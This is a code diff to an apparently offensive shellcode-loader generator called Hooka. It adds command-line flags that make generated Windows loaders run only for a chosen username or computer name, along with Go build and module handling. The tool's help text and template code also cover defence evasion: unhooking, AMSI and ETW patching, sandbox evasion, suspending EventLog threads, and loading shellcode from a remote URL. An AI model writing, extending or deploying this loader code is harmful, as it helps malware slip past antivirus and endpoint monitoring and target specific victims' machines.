@@ -70,15 +70,17 @@ Usage of Hooka:
     --strings            obfuscate strings using Caesar cipher
 
   EVASION:
-    --unhook string       unhooking technique to use (available: full, peruns)
-    --sandbox             enable sandbox evasion
-    --no-amsi             don't patch AMSI
-    --no-etw              don't patch ETW
-    --hashing             use hashes to retrieve function pointers
-    --acg                 enable ACG Guard to prevent AV/EDR from modifying existing executable code
-    --blockdlls           prevent non-Microsoft signed DLLs from injecting in child processes
-    --phantom             suspend EventLog threads using Phant0m technique. High privileges needed, otherwise loader skips this step
-    --sleep               delay shellcode execution using a custom sleep function
+    --unhook string         unhooking technique to use (available: full, peruns)
+    --sandbox               enable sandbox evasion
+    --no-amsi               don't patch AMSI
+    --no-etw                don't patch ETW
+    --hashing               use hashes to retrieve function pointers
+    --user string           proceed only when the user running the loader is the expected (i.e. DESKTOP-E1D6G0A\admin)
+    --computername string   proceed only when the computer name is the expected (i.e. DESKTOP-E1D6G0A)
+    --acg                   enable ACG Guard to prevent AV/EDR from modifying existing executable code
+    --blockdlls             prevent non-Microsoft signed DLLs from injecting in child processes
+    --phantom               suspend EventLog threads using Phant0m technique. High privileges needed, otherwise loader skips this step
+    --sleep                 delay shellcode execution using a custom sleep function
 
   EXTRA:
     --calc              use a calc.exe shellcode to test loader capabilities (don't provide input file)
@@ -90,7 +92,7 @@ Usage of Hooka:
 Examples:
   hooka -i shellcode.bin -o loader.exe
   hooka -i http://192.168.1.126/shellcode.bin -o loader.exe
-  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep 60 --acg
+  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep --acg
   hooka -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
 `)
 }
@@ -104,7 +106,7 @@ var buffer bytes.Buffer
 
 func main() {
   // define variables that will hold CLI arguments values
-  var input_file, output_file, format, arch, exec_technique, unhook, cert, domain, encrypt, process string
+  var input_file, output_file, format, arch, exec_technique, unhook, username, computername, cert, domain, encrypt, process string
   var sgn, str_obfs, sandbox, noamsi, noetw, hashing, acg, blockdlls, phantom, sleep_time, calc, compress, rand, verbose, help bool
 
   // Main arguments
@@ -138,6 +140,8 @@ func main() {
 	flag.BoolVar(&noamsi, "no-amsi", false, "")
 	flag.BoolVar(&noetw, "no-etw", false, "")
   flag.BoolVar(&hashing, "hashing", false, "")
+  flag.StringVar(&username, "user", "", "")
+  flag.StringVar(&computername, "computername", "", "")
   flag.BoolVar(&acg, "acg", false, "")
   flag.BoolVar(&blockdlls, "blockdlls", false, "")
   flag.BoolVar(&phantom, "phantom", false, "")
@@ -161,6 +165,14 @@ func main() {
     banner()
     help_panel()
     os.Exit(0)
+  }
+
+  var err error
+
+  _, err = exec.LookPath("go")
+  if err != nil {
+    fmt.Println("[-] \"go\" binary is not found on path and it is required to compile the loader")
+    log.Fatal(err)
   }
 
   // check if needed arguments were given
@@ -295,7 +307,6 @@ func main() {
   var exports []string
   var functions []string
   var dlls_to_unhook []string
-  var err error
 
   // Create template which will hold loader code
   Main := &LoaderTemplate{}
@@ -2105,6 +2116,20 @@ func {{.Vars.sleep_func}}() {
     functions = utils.AppendString(functions, ParseTemplate(sleep_func, Main))
   }
 
+  if (username != "") {
+    imports = utils.AppendString(imports, "os/user")
+
+    Main.Vars["username"] = utils.RandomString(utils.RandomInt(9,10))
+    Main.Vars["username_to_check"] = utils.RandomString(utils.RandomInt(9,10))
+  }
+
+  if (computername != "") {
+    imports = utils.AppendString(imports, "os")
+
+    Main.Vars["computername"] = utils.RandomString(utils.RandomInt(9,10))
+    Main.Vars["computername_to_check"] = utils.RandomString(utils.RandomInt(9,10))
+  }
+
   if (verbose) {
     fmt.Println()
   }
@@ -2806,6 +2831,32 @@ func ` + func_name + `(){
 `
   }
 
+  if (username != "") {
+    main_func = main_func + `
+  {{.Vars.username}}, {{.Vars.err}} := user.Current()
+  if {{.Vars.err}} != nil {
+    return
+  }
+
+  if ({{.Vars.username}}.Username != ` + ObfuscateStr(username, str_obfs) + `) {
+    return
+  }
+`
+  }
+
+  if (computername != "") {
+    main_func = main_func + `
+  {{.Vars.computername}}, {{.Vars.err}} := os.Hostname()
+  if {{.Vars.err}} != nil {
+    return
+  }
+
+  if ({{.Vars.computername}} != ` + ObfuscateStr(computername, str_obfs) + `) {
+    return
+  }
+`
+  }
+
   // add sandboxing functions
   if (sandbox) {
     main_func = main_func + `
@@ -2986,6 +3037,7 @@ var {{.Vars.shellcode}} []byte
   if err != nil {
     log.Fatal(err)
   }
+  defer os.Remove("loader.go")
 
   fmt.Println("[*] Compiling shellcode loader...")
   time.Sleep(100 * time.Millisecond)
@@ -3094,8 +3146,6 @@ var {{.Vars.shellcode}} []byte
 
   fmt.Println("\n[+] Shellcode loader has been successfully generated")
 
-  os.Remove("loader.go")
-
   if (format == "dll") {
     os.Remove(strings.Split(output_file, ".")[0] + ".h") // remove header file (e.g. loader.h)
   }
@@ -3179,28 +3229,53 @@ import (
 
 // function to compile loader code based on provided arguments
 func CompileLoader(format string, output_file string, compress bool, arch string) error {
+  // check if go.mod file exists
+  _, err := os.Stat("go.mod")
+  if os.IsNotExist(err) {
+
+    // if it doesn't exist, then create it
+    mod_cmd := exec.Command("go", "mod", "init", "hooka_ldr")
+    err = mod_cmd.Run()
+    if err != nil {
+      return err
+    }
+    defer os.Remove("go.mod")
+
+    // if go.mod didn't exist we also need to download the windows library
+    get_cmd := exec.Command("go", "get", "golang.org/x/sys/windows")
+    err = get_cmd.Run()
+    if err != nil {
+      return err
+    }
+    defer os.Remove("go.sum")
+  }
+
   // define command to compile source code
   var compile_cmd *exec.Cmd
 
   // compile as .EXE
   if (format == "exe") {
     if (compress) {
+      fmt.Println("  > go", "build", "-ldflags", "-w -s", "-o", output_file, "loader.go")
       compile_cmd = exec.Command("go", "build", "-ldflags", "-w -s", "-o", output_file, "loader.go")
     } else {
+      fmt.Println("  > go", "build", "-o", output_file, "loader.go")
       compile_cmd = exec.Command("go", "build", "-o", output_file, "loader.go")
     }
   } else if (format == "dll") { // compile as .DLL
     if (compress) {
+      fmt.Println("  > go", "build", "-ldflags", "-w -s", "-buildmode=c-shared", "-o", output_file, "loader.go")
       compile_cmd = exec.Command("go", "build", "-ldflags", "-w -s", "-buildmode=c-shared", "-o", output_file, "loader.go")
     } else {
+      fmt.Println("  > go", "build", "-buildmode=c-shared", "-o", output_file, "loader.go")
       compile_cmd = exec.Command("go", "build", "-buildmode=c-shared", "-o", output_file, "loader.go")
     }
   }
 
   compile_cmd.Env = append(os.Environ(), "GOARCH=" + arch, "GOOS=windows", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc")
-  err := compile_cmd.Run()
+  err = compile_cmd.Run()
   if err != nil {
-    fmt.Println("[-] Error while compiling loader!")
+    fmt.Println("\n[-] Error while compiling loader:")
     return err
   }
 
